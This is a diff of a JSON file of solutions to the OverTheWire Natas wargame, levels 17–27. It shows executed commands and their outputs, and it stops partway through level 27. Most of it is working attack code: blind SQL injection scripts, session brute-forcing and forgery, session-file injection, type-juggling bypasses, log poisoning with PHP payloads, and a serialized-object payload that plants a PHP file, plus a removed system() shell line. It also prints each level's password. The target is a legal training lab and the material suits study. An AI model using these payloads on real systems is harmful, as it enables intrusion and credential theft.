-    "(fast reply = false, ~2s reply = true)"
-   ],
-   "pw": "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op"
+   "pw": "fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"SELECT \\* from users[^;]*\"",
+     "out": [
+      "SELECT * from users where username=\\\"\".$_REQUEST[\"username\"].\"\\\"\""
+     ]
+    },
+    {
+     "cmd": "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+     "out": [
+      "echo -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+      "echo -n \"true condition  -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+      "true condition  -> 20.5 s",
+      "$ echo -n \"false condition -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+      "false condition -> 0.6 s"
+     ]
+    },
+    {
+     "cmd": "echo -n \"length = 32     -> \"; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x\" OR IF((SELECT LENGTH(password) FROM users WHERE username=\"natas18\")=32,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c \"print('%.1f s' % ($e - $s))\"",
+     "out": [
+      "length = 32     -> 20.4 s"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport subprocess, time\nBASE = 'http://natas17.natas.labs.overthewire.org/'\nUSER, PW = 'natas17', 'KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx'\ndef timed(p):\n    t0 = time.time()\n    subprocess.run(['curl','-s','-m','90','-o','/dev/null','-u',USER+':'+PW,\n                    '--data-urlencode','username='+p,BASE],\n                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=100)\n    return time.time() - t0\ndef cond(expr):\n    return timed('x\" OR IF(' + expr + ',SLEEP(5),0)-- -') > 8.0\npw = ''\nfor pos in range(1, 33):\n    lo, hi = 32, 127\n    while lo < hi:\n        mid = (lo + hi + 1) // 2\n        e = ('(SELECT ORD(SUBSTR(password,' + str(pos) + ',1)) FROM users WHERE username=\"natas18\")>=' + str(mid))\n        if cond(e):\n            lo = mid\n        else:\n            hi = mid - 1\n    pw += chr(lo)\n    print('pos', pos, repr(chr(lo)), pw, flush=True)\nprint('FINAL', pw, flush=True)\nPY\nPY",
+     "out": [
+      "pos 1 'f' f",
+      "pos 2 'D' fD",
+      "pos 3 'G' fDG",
+      "pos 4 'n' fDGn",
+      "pos 5 '2' fDGn2",
+      "pos 6 'A' fDGn2A",
+      "pos 7 '6' fDGn2A6",
+      "pos 8 'G' fDGn2A6G",
+      "pos 9 's' fDGn2A6Gs",
+      "pos 10 'c' fDGn2A6Gsc",
+      "pos 11 '0' fDGn2A6Gsc0",
+      "pos 12 'B' fDGn2A6Gsc0B",
+      "pos 13 'U' fDGn2A6Gsc0BU",
+      "pos 14 'p' fDGn2A6Gsc0BUp",
+      "pos 15 '3' fDGn2A6Gsc0BUp3",
+      "pos 16 'b' fDGn2A6Gsc0BUp3b",
+      "pos 17 'Z' fDGn2A6Gsc0BUp3bZ",
+      "pos 18 'w' fDGn2A6Gsc0BUp3bZw",
+      "pos 19 '0' fDGn2A6Gsc0BUp3bZw0"
+     ]
+    }
+   ]
   },
   {
    "lvl": 18,
    "user": "natas18",
-   "cmds": [
-    [
-     "# source: $maxid = 640 \u2014 session ids are rand(1, 640), and an admin is already logged in somewhere",
-     "for i in $(seq 1 640); do curl -s -u natas18:PASS -b \"PHPSESSID=$i\" http://natas18.natas.labs.overthewire.org/ | grep -q 'You are an admin' && echo \"admin session: $i\" && break; done",
-     "# id 119 was the admin's"
-    ]
-   ],
-   "out": [
-    "You are an admin. The credentials for the next level are: Username: natas19"
-   ],
-   "pw": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT"
+   "pw": "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"maxid = 640\"",
+     "out": [
+      "maxid = 640"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, base64\nurl = \"http://natas18.natas.labs.overthewire.org/\"\nauth = \"Basic \" + base64.b64encode(b\"natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op\").decode()\nfor sid in range(1, 641):\n    req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\": \"PHPSESSID=%d\" % sid})\n    body = urllib.request.urlopen(req, timeout=10).read().decode(\"utf-8\", \"replace\")\n    if \"You are an admin\" in body:\n        i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)\n        print(\"FOUND sid\", sid)\n        print(body[i:j+6])\n        break\nelse:\n    print(\"none\")\nPY",
+     "out": [
+      "FOUND sid 119",
+      "<pre>Username: natas19",
+      "Password: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT</pre>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 19,
    "user": "natas19",
-   "cmds": [
-    [
-     "# source: session id = bin2hex(\"<num>-<username>\") \u2014 so forge ids for the user 'admin'",
-     "for i in $(seq 1 640); do ID=$(printf '%s-admin' $i | xxd -p | tr -d '\\n'); curl -s -u natas19:PASS -b \"PHPSESSID=$ID\" http://natas19.natas.labs.overthewire.org/ | grep -q 'You are an admin' && echo \"admin session: $i-admin\" && break; done",
-     "# 281-admin was live"
-    ]
-   ],
-   "out": [
-    "You are an admin. The credentials for the next level are: Username: natas20"
-   ],
-   "pw": "slOKYGsjlJhaqKliGvrgWAzln0JyrWao"
+   "pw": "slOKYGsjlJhaqKliGvrgWAzln0JyrWao",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT http://natas19.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | grep -o \"idstr = [^;]*\" | head -2",
+     "out": [
+      "idstr = \"$idnum-$user\""
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, base64\nurl = \"http://natas19.natas.labs.overthewire.org/\"\nauth = \"Basic \" + base64.b64encode(b\"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT\").decode()\nfor n in range(1, 641):\n    sid = (str(n) + \"-admin\").encode().hex()\n    req = urllib.request.Request(url, headers={\"Authorization\": auth, \"Cookie\": \"PHPSESSID=\" + sid})\n    body = urllib.request.urlopen(req, timeout=10).read().decode(\"utf-8\", \"replace\")\n    if \"You are an admin\" in body:\n        i = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)\n        print(\"FOUND n\", n, \"sid\", sid)\n        print(body[i:j+6])\n        break\nelse:\n    print(\"none\")\nPY",
+     "out": [
+      "FOUND n 281 sid 3238312d61646d696e",
+      "<pre>Username: natas20",
+      "Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao</pre>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 20,
    "user": "natas20",
-   "cmds": [
-    [
-     "# sessions are stored as plain 'key value' lines \u2014 the name value is never sanitized",
-     "curl -s -u natas20:PASS -c cj.txt http://natas20.natas.labs.overthewire.org/ -o /dev/null",
-     "curl -s -u natas20:PASS -b cj.txt --data-urlencode $'name=bob\\nadmin 1' http://natas20.natas.labs.overthewire.org/",
-     "# the session file now contains a forged line:  admin 1",
-     "curl -s -u natas20:PASS -b cj.txt http://natas20.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "You are an admin. The credentials for the next level are: Username: natas21"
-   ],
-   "pw": "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU"
+   "pw": "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao http://natas20.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"function myread[^}]*}\\|function mywrite[^}]*}\" | head -c 700",
+     "out": [
+      "function myread($sid) {    debug(\"MYREAD $sid\");    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return \"\";    }",
+      "function mywrite($sid, $data) {    // $data contains the serialized version of $_SESSION    // but our encoding is better    debug(\"MYWRITE $sid $data\");    // make sure the sid is alnum only!!    if(strspn($sid, \"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-\") != strlen($sid)) {    debug(\"Invalid SID\");        return;    }"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64, http.cookiejar\nauth = \"Basic \" + base64.b64encode(b\"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao\").decode()\nurl = \"http://natas20.natas.labs.overthewire.org/\"\ncj = http.cookiejar.CookieJar()\nop = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\ndata = urllib.parse.urlencode({\"name\": \"x\\nadmin 1\"}).encode()\nop.open(urllib.request.Request(url, data=data, headers={\"Authorization\": auth}), timeout=10).read()\nbody = op.open(urllib.request.Request(url, headers={\"Authorization\": auth}), timeout=10).read().decode(\"utf-8\", \"replace\")\ni = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)\nprint(\"You are an admin:\", \"You are an admin\" in body)\nprint(body[i:j+6] if i >= 0 else body[:200])\nPY",
+     "out": [
+      "You are an admin: True",
+      "<pre>Username: natas21",
+      "Password: 7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU</pre>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 21,
    "user": "natas21",
-   "cmds": [
-    [
-     "# the main site is colocated with natas21-experimenter \u2014 same sessions",
-     "# the experimenter's source copies EVERY submitted field into $_SESSION",
-     "curl -s -u natas21:PASS -c e.txt http://natas21-experimenter.natas.labs.overthewire.org/ -o /dev/null",
-     "curl -s -u natas21:PASS -b e.txt -c e.txt -d 'align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update' http://natas21-experimenter.natas.labs.overthewire.org/",
-     "# now present that session id to the main site:",
-     "curl -s -u natas21:PASS -b \"PHPSESSID=$SID\" http://natas21.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "[DEBUG] Session contents: [admin] => 1",
-    "You are an admin. The credentials for the next level are: Username: natas22"
-   ],
-   "pw": "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF"
+   "pw": "964laB0r7TuDqJj5b3HFtwsQoc0GhjBF",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU http://natas21-experimenter.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"foreach(\\$_REQUEST[^}]*}\"",
+     "out": [
+      "foreach($_REQUEST as $key => $val) {    $_SESSION[$key] = $val;    }"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport urllib.request, urllib.parse, base64\nauth = \"Basic \" + base64.b64encode(b\"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU\").decode()\nexp = \"http://natas21-experimenter.natas.labs.overthewire.org/\"\nmain = \"http://natas21.natas.labs.overthewire.org/\"\ndata = urllib.parse.urlencode({\"submit\": \"1\", \"admin\": \"1\", \"bgcolor\": \"#fff\", \"align\": \"left\", \"fontsize\": \"100%\"}).encode()\nr = urllib.request.urlopen(urllib.request.Request(exp, data=data, headers={\"Authorization\": auth}), timeout=10)\nsid = None\nfor c in (r.headers.get_all(\"Set-Cookie\") or []):\n    if \"PHPSESSID=\" in c:\n        sid = c.split(\"PHPSESSID=\")[1].split(\";\")[0]\nprint(\"session id:\", sid)\nbody = urllib.request.urlopen(urllib.request.Request(main, headers={\"Authorization\": auth, \"Cookie\": \"PHPSESSID=\" + sid}), timeout=10).read().decode(\"utf-8\", \"replace\")\ni = body.find(\"<pre>\"); j = body.find(\"</pre>\", i)\nprint(\"admin:\", \"You are an admin\" in body)\nprint(body[i:j+6] if i >= 0 else \"\")\nPY",
+     "out": [
+      "session id: aovb6lanm8c5ilidcftndjaffj",
+      "admin: True",
+      "<pre>Username: natas22",
+      "Password: 964laB0r7TuDqJj5b3HFtwsQoc0GhjBF</pre>"
+     ]
+    }
+   ]
   },
   {
    "lvl": 22,
    "user": "natas22",
-   "cmds": [
-    [
-     "# the page just redirects to / and shows nothing\u2026",
-     "curl -s -i -u natas22:PASS 'http://natas22.natas.labs.overthewire.org/?revelio=1'",
-     "# \u2026but the redirect's own body already contains the credentials \u2014 never follow it"
-    ]
-   ],
-   "out": [
-    "Location: /",
-    "You are an admin. The credentials for the next level are: Username: natas23"
-   ],
-   "pw": "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5"
+   "pw": "CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF http://natas22.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(array_key_exists(\\\"revelio\\\"[^}]*}\"",
+     "out": [
+      "if(array_key_exists(\"revelio\", $_GET)) {    // only admins can reveal the password    if(!($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1)) {    header(\"Location: /\");    }",
+      "if(array_key_exists(\"revelio\", $_GET)) {    print \"You are an admin. The credentials for the next level are:<br>\";    print \"<pre>Username: natas23\\n\";    print \"Password: <censored></pre>\";    }"
+     ]
+    },
+    {
+     "cmd": "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF \"http://natas22.natas.labs.overthewire.org/?revelio\" | sed \"s/<[^>]*>//g\" | grep -aE \"admin|Username|Password\"",
+     "out": [
+      "You are an admin. The credentials for the next level are:Username: natas23",
+      "Password: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5"
+     ]
+    }
+   ]
   },
   {
    "lvl": 23,
    "user": "natas23",
-   "cmds": [
-    [
-     "# source: strstr($passwd, \"iloveyou\") && $passwd > 10",
-     "# PHP compares a string that starts with digits as a number:",
-     "curl -s -u natas23:PASS 'http://natas23.natas.labs.overthewire.org/?passwd=11iloveyou'"
-    ]
-   ],
-   "out": [
-    "The credentials for the next level are: Username: natas24"
-   ],
-   "pw": "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX"
+   "pw": "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 http://natas23.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(strstr[^}]*}\"",
+     "out": [
+      "if(strstr($_REQUEST[\"passwd\"],\"iloveyou\") &amp;&amp; ($_REQUEST[\"passwd\"] > 10 )){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas24 Password: <censored></pre>\";        }"
+     ]
+    },
+    {
+     "cmd": "for p in 'iloveyou' '10111iloveyou' 'iloveyou10111'; do\n  echo \"passwd=$p\"\n  curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 \"http://natas23.natas.labs.overthewire.org/?passwd=$p\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password\"\ndone",
+     "out": [
+      "passwd=iloveyou",
+      "Password:",
+      "Wrong!  ",
+      "passwd=10111iloveyou",
+      "Password:",
+      "The credentials for the next level are:Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX  ",
+      "passwd=iloveyou10111",
+      "Password:",
+      "Wrong!  "
+     ]
+    }
+   ]
   },
   {
    "lvl": 24,
    "user": "natas24",
-   "cmds": [
-    [
-     "# source: if(!strcmp($_REQUEST[\"passwd\"], $real_password)) \u2014 strcmp expects strings",
-     "# hand it an array instead and it returns NULL, which ! turns into success:",
-     "curl -s -u natas24:PASS 'http://natas24.natas.labs.overthewire.org/?passwd[]=x'"
-    ]
-   ],
-   "out": [
-    "The credentials for the next level are: Username: natas25"
-   ],
-   "pw": "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo"
+   "pw": "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX http://natas24.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(!strcmp[^}]*}\"",
+     "out": [
+      "if(!strcmp($_REQUEST[\"passwd\"],\"<censored>\")){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas25 Password: <censored></pre>\";        }"
+     ]
+    },
+    {
+     "cmd": "echo \"passwd=x (a string):\"\ncurl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX \"http://natas24.natas.labs.overthewire.org/?passwd=x\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password\"\necho \"passwd[]=x (an array):\"\ncurl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX \"http://natas24.natas.labs.overthewire.org/?passwd[]=x\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password|Warning\"",
+     "out": [
+      "passwd=x (a string):",
+      "Password:",
+      "Wrong!  ",
+      "passwd[]=x (an array):",
+      "Password:",
+      "Warning:  strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23",
+      "The credentials for the next level are:Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo  "
+     ]
+    }
+   ]
   },
   {
    "lvl": 25,
    "user": "natas25",
-   "cmds": [
-    [
-     "# direct access to natas_webpass is blocked by name, and ../ is stripped once\u2026",
-     "# \u2026so poison the request log instead: traversal attempts log your User-Agent",
-     "curl -s -u natas25:PASS -c cj.txt http://natas25.natas.labs.overthewire.org/ -o /dev/null",
-     "curl -s -u natas25:PASS -b cj.txt -A '<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>' 'http://natas25.natas.labs.overthewire.org/?lang=../en'",
-     "# include the log \u2014 ....// collapses to ../ under the single-pass strip:",
-     "curl -s -u natas25:PASS -b cj.txt 'http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_<sessionid>.log'"
-    ]
-   ],
-   "out": [
-    "[21.10.2026 03::59:23] <the password printed where the User-Agent stood>"
-   ],
-   "pw": "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
+   "pw": "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"function safeinclude.*return 0;\"",
+     "out": [
+      "function safeinclude($filename){        // check for directory traversal        if(strstr($filename,\"../\")){            logRequest(\"Directory traversal attempt! fixing request.\");            $filename=str_replace(\"../\",\"\",$filename);        }        // dont let ppl steal our passwords        if(strstr($filename,\"natas_webpass\")){            logRequest(\"Illegal file access detected! Aborting!\");            exit(-1);        }        // add more checks...        if (file_exists($filename)) {             include($filename);            return 1;        }        return 0;"
+     ]
+    },
+    {
+     "cmd": "curl -s -c /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/ -o /dev/null\nSID=$(awk '/PHPSESSID/{print $7}' /tmp/n25.jar); echo \"PHPSESSID=$SID\"",
+     "out": [
+      "PHPSESSID=pb9r1evha3peej8j0etqjb38u7"
+     ]
+    },
+    {
+     "cmd": "curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -A '<?php echo file_get_contents(\"/etc/natas_webpass/natas26\"); ?>' --get --data-urlencode 'lang=../x' http://natas25.natas.labs.overthewire.org/ -o /dev/null\necho \"traversal request sent; the User-Agent line is now in logs/natas25_$SID.log\"",
+     "out": [
+      "traversal request sent; the User-Agent line is now in logs/natas25_pb9r1evha3peej8j0etqjb38u7.log"
+     ]
+    },
+    {
+     "cmd": "curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo --get --data-urlencode \"lang=....//logs/natas25_$SID.log\" http://natas25.natas.labs.overthewire.org/ | grep -o \"[A-Za-z0-9]\\{32\\}\" | tail -1",
+     "out": [
+      "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT"
+     ]
+    }
+   ]
   },
   {
    "lvl": 26,
    "user": "natas26",
-   "cmds": [
-    [
-     "# the 'drawing' cookie is base64_decode + unserialize \u2014 a Logger class is in scope",
-     "# its __destruct appends $exitMsg to $logFile, and both are attacker-controlled:",
-     "python3 -c \"import base64; print(base64.b64encode(b'O:6:\\\"Logger\\\":3:{...logFile=img/shell.php, exitMsg=<?php system($_GET[c]); ?>...}').decode())\"",
-     "curl -s -u natas26:PASS -b 'drawing=<base64 payload>' 'http://natas26.natas.labs.overthewire.org/?x1=1&y1=1&x2=2&y2=2'",
-     "curl -s -u natas26:PASS 'http://natas26.natas.labs.overthewire.org/img/shell.php?c=cat%20/etc/natas_webpass/natas27'"
-    ]
-   ],
-   "out": [
-    "(the destructor writes the shell into img/)"
-   ],
-   "pw": "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
+   "pw": "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -E \"class Logger|private \\$|function __|logFile|unserialize\"",
+     "out": [
+      "class Logger{",
+      "private $logFile;",
+      "function __construct($file){",
+      "$this->logFile = \"/tmp/natas26_\" . $file . \".log\";",
+      "$fd=fopen($this->logFile,\"a+\");",
+      "$fd=fopen($this->logFile,\"a+\");",
+      "function __destruct(){",
+      "$fd=fopen($this->logFile,\"a+\");",
+      "$drawing=unserialize(base64_decode($_COOKIE[\"drawing\"]));",
+      "$drawing=unserialize(base64_decode($_COOKIE[\"drawing\"]));"
+     ]
+    },
+    {
+     "cmd": "curl -s -c /tmp/n26.jar -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/ -o /dev/null\nSID=$(awk '/PHPSESSID/{print $7}' /tmp/n26.jar); echo \"PHPSESSID=$SID\"",
+     "out": [
+      "PHPSESSID=h88c0luh6ili1k67a56ql07n6j"
+     ]
+    },
+    {
+     "cmd": "python3 - <<'PY'\nimport base64\nsid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]\nphp = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"\npath = \"img/natas26_%s.php\" % sid\npayload = ('O:6:\"Logger\":3:{'\n           's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'\n           's:15:\"\\x00Logger\\x00initMsg\";s:0:\"\";'\n           's:15:\"\\x00Logger\\x00exitMsg\";s:%d:\"%s\";}' % (len(path), path, len(php), php))\nprint(base64.b64encode(payload.encode()).decode())\nPY",
+     "out": [
+      "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfaDg4YzBsdWg2aWxpMWs2N2E1NnFsMDduNmoucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"
+     ]
+    },
+    {
+     "cmd": "B=$(python3 - <<'PY'\nimport base64\nsid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]\nphp = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"\npath = \"img/natas26_%s.php\" % sid\npayload = ('O:6:\"Logger\":3:{'\n           's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'\n           's:15:\"\\x00Logger\\x00initMsg\";s:0:\"\";'\n           's:15:\"\\x00Logger\\x00exitMsg\";s:%d:\"%s\";}' % (len(path), path, len(php), php))\nprint(base64.b64encode(payload.encode()).decode())\nPY\n)\ncurl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT -H \"Cookie: PHPSESSID=$SID; drawing=$B\" --get --data-urlencode \"x1=1\" --data-urlencode \"y1=1\" --data-urlencode \"x2=2\" --data-urlencode \"y2=2\" http://natas26.natas.labs.overthewire.org/ -o /dev/null\ncurl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT \"http://natas26.natas.labs.overthewire.org/img/natas26_$SID.php\"",
+     "out": [
+      "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV",
+      "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
+     ]
+    }
+   ]
   },
   {
    "lvl": 27,
    "user": "natas27",
-   "cmds": [
-    [
-     "# createUser rejects names with leading/trailing blanks \u2014 but stores only substr(name, 0, 64)",
-     "# and dumpData() looks the user up with trim() applied. So:",
-     "curl -s -u natas27:PASS --data-urlencode 'username=natas28<57 spaces>a' --data-urlencode 'password=<redacted>' http://natas27.natas.labs.overthewire.org/",
-     "# the stored row is now 'natas28' + 57 spaces. Log in under THAT name with your password:",
-     "curl -s -u natas27:PASS --data-urlencode 'username=natas28<57 spaces>' --data-urlencode 'password=<redacted>' http://natas27.natas.labs.overthewire.org/"
-    ]
-   ],
-   "out": [
-    "Welcome natas28  ! Here is your data: Array ( [username] => natas28 [password] => \u2026 )"
-   ],
-   "pw": "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3"
+   "pw": "Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3",
+   "steps": [
+    {
+     "cmd": "curl -s -u natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV http://natas27.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -E \"CREATE TABLE|varchar|substr|trim|INSERT|SELECT\"",
+     "out": [
+      "<html><head><!-- This stuff in the header has nothing to do with the level --><link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\"><link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /><link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" /><script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script><script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script><script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script><script>var wechallinfo = { \"level\": \"natas27\", \"pass\": \"<censored>\" };</script></head><body><h1>natas27</h1><div id=\"content\"><?php// morla / 10111// database gets cleared every 5 min/*CREATE TABLE `users` (  `username` varchar(64) DEFAULT NULL,  `password` varchar(64) DEFAULT NULL);*/function checkCredentials($link,$usr,$pass){",
